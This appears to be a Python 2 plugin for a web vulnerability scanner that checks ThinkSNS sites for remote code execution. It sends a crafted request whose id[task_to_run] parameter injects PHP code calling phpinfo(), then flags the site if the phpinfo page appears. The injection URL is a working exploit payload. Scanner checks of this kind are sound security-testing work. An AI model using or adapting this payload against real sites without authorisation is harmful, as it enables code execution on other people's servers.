#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''  
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"index.php?app=widget&mod=Category&act=getChild&model_name=Schedule&method=runSchedule&id[task_to_run]=addons/Area)->getAreaList();phpinfo();%23")
        r,c=requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        r1,c1=requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if c.find("<title>phpinfo()</title>")>=0 and c1.find("<title>phpinfo()</title>")<0:
            
       
            request = getRequest(expurl)
            response = getResponse(r)
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:thinksnsremoecmdsscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
    
    return list
#end def